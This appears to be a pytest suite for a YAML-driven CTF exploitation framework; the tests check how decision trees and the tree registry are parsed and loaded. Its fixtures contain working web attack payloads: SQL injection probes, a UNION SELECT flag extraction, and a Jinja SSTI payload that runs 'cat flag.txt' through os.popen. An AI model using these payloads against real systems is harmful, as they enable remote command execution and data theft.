"""
Deep tests for DecisionTree, TreeRegistry, and the two YAML schemas (A and B).

Covers:
- DecisionTree: field parsing for all YAML sections
- DecisionTree: schema A (nested detection/exploitation) and schema B (top-level paths)
- DecisionTree: confidence_seeds parsed correctly
- DecisionTree: detection_paths / steps / signals structure
- DecisionTree: exploitation_paths / steps / capture structure
- DecisionTree: defaults (version, author, min_confidence, stop_on_flag)
- TreeRegistry.load_file: happy path and error resilience
- TreeRegistry.load_from_directory: scans recursively
- TreeRegistry.get_tree: found / not found
- TreeRegistry.list_trees: returns all trees
- TreeRegistry: duplicate IDs (last-write wins, no crash)
"""

import os
import tempfile
import textwrap

import pytest
import yaml

from lattice_mind.core.tree_loader import (
    ConfidenceSeed,
    DecisionTree,
    DetectionPath,
    DetectionStep,
    ExploitationPath,
    ExploitationStep,
    TreeRegistry,
    get_tree_registry,
)

# ──────────────────────────────────────────────────────────────────────────────
# YAML fixtures
# ──────────────────────────────────────────────────────────────────────────────

SCHEMA_A_YAML = textwrap.dedent("""\
    id: sqli_tree
    name: SQL Injection Detection
    category: web
    version: "2.1"
    author: tester
    description: Detect basic SQLi
    confidence_seeds:
      - if: "context.challenge.type == 'web'"
        boost: 0.5
        label: is_web
      - if: "context.score > 10"
        boost: 0.2
        label: high_score
    detection:
      min_confidence: 0.15
      paths:
        - id: dp_sqli
          name: Reflection Detection
          description: Probe sqli
          min_confidence: 0.15
          steps:
            - id: probe_step
              action: http_probe
              params:
                payloads: ["'", "''"]
                inject_into: all_params
              signals:
                - match: "syntax error"
                  on_match:
                    confidence_boost: 0.4
                    emit: sqli_reflected
    exploitation:
      stop_on_flag: true
      paths:
        - id: ep_union
          name: Union Exploit
          requires_signal: sqli_reflected
          technique: union_select
          steps:
            - id: union_step
              action: http_probe
              params:
                payloads: ["' UNION SELECT flag FROM flags--"]
                inject_into: vulnerable_param
              capture:
                - pattern: 'flag\{([^}]+)\}'
                  as: flag_value
""")

SCHEMA_B_YAML = textwrap.dedent("""\
    id: ssti_tree
    name: SSTI Detection
    category: web
    min_confidence: 0.2
    stop_on_flag: true
    confidence_seeds: []
    detection_paths:
      - id: dp_ssti
        name: Template Injection
        description: ''
        min_confidence: 0.2
        steps:
          - id: tpl_step
            action: http_probe
            with:
              payloads: ['{{7*7}}']
              inject_into: all_params
            signals:
              - match: "49"
                on_match:
                  confidence_boost: 0.6
                  emit: ssti_confirmed
    exploitation_paths:
      - id: ep_ssti
        name: RCE via SSTI
        requires_signal: ssti_confirmed
        technique: ssti_rce
        steps:
          - id: rce_step
            action: http_probe
            with:
              payloads: ["{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}"]
              inject_into: vulnerable_param
            capture:
              - pattern: 'flag\{([^}]+)\}'
                as: flag_value
""")

MINIMAL_YAML = textwrap.dedent("""\
    id: minimal
    name: Minimal Tree
    category: misc
    confidence_seeds: []
    detection_paths: []
    exploitation_paths: []
""")


def _load_tree(yaml_str: str) -> DecisionTree:
    raw = yaml.safe_load(yaml_str)
    return DecisionTree(raw)


def _write_yaml(directory: str, filename: str, content: str) -> str:
    path = os.path.join(directory, filename)
    with open(path, "w") as f:
        f.write(content)
    return path


# ──────────────────────────────────────────────────────────────────────────────
# DecisionTree — field parsing
# ──────────────────────────────────────────────────────────────────────────────


class TestDecisionTreeParsing:

    # ── id, name, category, version, author ───────────────────────────────────

    def test_id_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.id == "sqli_tree"

    def test_name_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.name == "SQL Injection Detection"

    def test_category_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.category == "web"

    def test_version_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.version == "2.1"

    def test_author_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.author == "tester"

    def test_description_parsed(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.description == "Detect basic SQLi"

    def test_defaults_version(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.version == "1.0"

    def test_defaults_author(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.author == "system"

    def test_defaults_min_confidence(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.min_confidence == pytest.approx(0.10)

    def test_defaults_stop_on_flag(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.stop_on_flag is True

    def test_enabled_is_true(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.enabled is True

    # ── confidence_seeds ──────────────────────────────────────────────────────

    def test_seeds_count(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert len(tree.confidence_seeds) == 2

    def test_seed_dataclass_type(self):
        tree = _load_tree(SCHEMA_A_YAML)
        for seed in tree.confidence_seeds:
            assert isinstance(seed, ConfidenceSeed)

    def test_seed_condition(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.confidence_seeds[0].condition == "context.challenge.type == 'web'"

    def test_seed_boost(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.confidence_seeds[0].boost == pytest.approx(0.5)

    def test_seed_label(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.confidence_seeds[0].label == "is_web"

    def test_empty_seeds_list(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.confidence_seeds == []

    # ── detection_paths (Schema A) ────────────────────────────────────────────

    def test_detection_paths_count_schema_a(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert len(tree.detection_paths) == 1

    def test_detection_path_type(self):
        tree = _load_tree(SCHEMA_A_YAML)
        for dp in tree.detection_paths:
            assert isinstance(dp, DetectionPath)

    def test_detection_path_id(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.detection_paths[0].id == "dp_sqli"

    def test_detection_path_name(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.detection_paths[0].name == "Reflection Detection"

    def test_detection_path_min_confidence(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.detection_paths[0].min_confidence == pytest.approx(0.15)

    def test_min_confidence_schema_a_nested(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert tree.min_confidence == pytest.approx(0.15)

    def test_detection_steps_count(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert len(tree.detection_paths[0].steps) == 1

    def test_detection_step_type(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.detection_paths[0].steps[0]
        assert isinstance(step, DetectionStep)

    def test_detection_step_id(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.detection_paths[0].steps[0]
        assert step.id == "probe_step"

    def test_detection_step_action(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.detection_paths[0].steps[0]
        assert step.action == "http_probe"

    def test_detection_step_params_payloads(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.detection_paths[0].steps[0]
        assert "'" in step.params["payloads"]

    def test_detection_step_signals(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.detection_paths[0].steps[0]
        assert len(step.signals) == 1
        sig = step.signals[0]
        assert sig["match"] == "syntax error"
        assert sig["on_match"]["emit"] == "sqli_reflected"

    # ── detection_paths (Schema B — top-level, 'with' key) ────────────────────

    def test_detection_paths_count_schema_b(self):
        tree = _load_tree(SCHEMA_B_YAML)
        assert len(tree.detection_paths) == 1

    def test_schema_b_min_confidence(self):
        tree = _load_tree(SCHEMA_B_YAML)
        assert tree.min_confidence == pytest.approx(0.2)

    def test_schema_b_stop_on_flag(self):
        tree = _load_tree(SCHEMA_B_YAML)
        assert tree.stop_on_flag is True

    def test_schema_b_with_key_used_for_params(self):
        """Schema B uses 'with' instead of 'params' — should be parsed to params."""
        tree = _load_tree(SCHEMA_B_YAML)
        step = tree.detection_paths[0].steps[0]
        assert "payloads" in step.params
        assert "{{7*7}}" in step.params["payloads"]

    # ── exploitation_paths ────────────────────────────────────────────────────

    def test_exploitation_paths_count_schema_a(self):
        tree = _load_tree(SCHEMA_A_YAML)
        assert len(tree.exploitation_paths) == 1

    def test_exploitation_path_type(self):
        tree = _load_tree(SCHEMA_A_YAML)
        for ep in tree.exploitation_paths:
            assert isinstance(ep, ExploitationPath)

    def test_exploitation_path_id(self):
        tree = _load_tree(SCHEMA_A_YAML)
        ep = tree.exploitation_paths[0]
        assert ep.id == "ep_union"

    def test_exploitation_path_requires_signal(self):
        tree = _load_tree(SCHEMA_A_YAML)
        ep = tree.exploitation_paths[0]
        assert ep.requires_signal == "sqli_reflected"

    def test_exploitation_path_technique(self):
        tree = _load_tree(SCHEMA_A_YAML)
        ep = tree.exploitation_paths[0]
        assert ep.technique == "union_select"

    def test_exploitation_step_type(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.exploitation_paths[0].steps[0]
        assert isinstance(step, ExploitationStep)

    def test_exploitation_step_capture_field(self):
        tree = _load_tree(SCHEMA_A_YAML)
        step = tree.exploitation_paths[0].steps[0]
        assert len(step.capture) == 1
        cap = step.capture[0]
        assert cap["as"] == "flag_value"

    def test_exploitation_paths_empty_minimal(self):
        tree = _load_tree(MINIMAL_YAML)
        assert tree.exploitation_paths == []


# ──────────────────────────────────────────────────────────────────────────────
# TreeRegistry
# ──────────────────────────────────────────────────────────────────────────────


class TestTreeRegistry:

    def mk(self) -> TreeRegistry:
        return TreeRegistry()

    def test_load_file_happy_path(self, tmp_path):
        path = _write_yaml(str(tmp_path), "tree.yaml", SCHEMA_A_YAML)
        reg = self.mk()
        reg.load_file(path)
        assert "sqli_tree" in reg.trees

    def test_loaded_tree_is_decision_tree(self, tmp_path):
        path = _write_yaml(str(tmp_path), "tree.yaml", SCHEMA_A_YAML)
        reg = self.mk()
        reg.load_file(path)
        assert isinstance(reg.trees["sqli_tree"], DecisionTree)

    def test_load_file_missing_id_skipped(self, tmp_path):
        content = "name: No ID Tree\ncategory: misc\n"
        path = _write_yaml(str(tmp_path), "noid.yaml", content)
        reg = self.mk()
        reg.load_file(path)  # Should not raise
        assert len(reg.trees) == 0

    def test_load_file_invalid_yaml_no_crash(self, tmp_path):
        path = _write_yaml(str(tmp_path), "bad.yaml", ": invalid :: yaml ]]][")
        reg = self.mk()
        reg.load_file(path)  # Should handle gracefully
        assert len(reg.trees) == 0

    def test_load_file_nonexistent_no_crash(self):
        reg = self.mk()
        reg.load_file("/nonexistent/path/to/file.yaml")  # Should not raise

    def test_load_from_directory(self, tmp_path):
        _write_yaml(str(tmp_path), "a.yaml", SCHEMA_A_YAML)
        _write_yaml(str(tmp_path), "b.yaml", SCHEMA_B_YAML)
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        assert "sqli_tree" in reg.trees
        assert "ssti_tree" in reg.trees

    def test_load_from_directory_recursive(self, tmp_path):
        sub = tmp_path / "subdir"
        sub.mkdir()
        _write_yaml(str(sub), "sub.yaml", SCHEMA_A_YAML)
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        assert "sqli_tree" in reg.trees

    def test_load_from_directory_ignores_non_yaml(self, tmp_path):
        (tmp_path / "notes.txt").write_text("id: fake\nname: will be ignored\n")
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        assert len(reg.trees) == 0

    def test_get_tree_found(self, tmp_path):
        _write_yaml(str(tmp_path), "t.yaml", SCHEMA_A_YAML)
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        tree = reg.get_tree("sqli_tree")
        assert tree is not None
        assert tree.id == "sqli_tree"

    def test_get_tree_not_found_returns_none(self):
        reg = self.mk()
        assert reg.get_tree("nonexistent") is None

    def test_list_trees_empty(self):
        reg = self.mk()
        assert reg.list_trees() == []

    def test_list_trees_returns_all(self, tmp_path):
        _write_yaml(str(tmp_path), "a.yaml", SCHEMA_A_YAML)
        _write_yaml(str(tmp_path), "b.yaml", SCHEMA_B_YAML)
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        ids = {t.id for t in reg.list_trees()}
        assert ids == {"sqli_tree", "ssti_tree"}

    def test_duplicate_id_no_crash(self, tmp_path):
        _write_yaml(str(tmp_path), "a.yaml", SCHEMA_A_YAML)
        _write_yaml(str(tmp_path), "b.yaml", SCHEMA_A_YAML)  # same id
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        # Two files, same id — should still have sqli_tree
        assert "sqli_tree" in reg.trees

    def test_yml_extension_also_loaded(self, tmp_path):
        path = str(tmp_path / "tree.yml")
        with open(path, "w") as f:
            f.write(MINIMAL_YAML)
        reg = self.mk()
        reg.load_from_directory(str(tmp_path))
        assert "minimal" in reg.trees

    # ── Global singleton ────────────────────────────────────────────────────

    def test_get_tree_registry_returns_registry(self):
        reg = get_tree_registry()
        assert isinstance(reg, TreeRegistry)

    def test_get_tree_registry_singleton(self):
        r1 = get_tree_registry()
        r2 = get_tree_registry()
        assert r1 is r2
